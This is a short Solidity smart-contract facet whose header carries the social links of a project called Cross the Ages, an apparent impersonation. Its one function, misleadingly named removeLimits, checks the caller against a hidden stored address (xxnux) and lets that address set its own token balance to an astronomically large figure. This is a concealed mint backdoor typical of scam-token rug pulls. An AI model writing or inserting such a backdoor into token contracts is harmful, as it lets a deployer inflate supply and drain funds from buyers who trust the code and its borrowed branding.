/*  
   * SPDX-License-Identifier: MIT

     // Telegram: https://t.me/crosstheages
    // Twitter: https://twitter.com/crosstheages
    // Website: https://www.crosstheages.com/
    // Github: https://github.com/crosstheages
    // Discord: https://discord.com/invite/cross-the-ages-917028207566401586
    // Medium: https://medium.com/cross-the-ages
*/

pragma solidity ^0.8.23;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
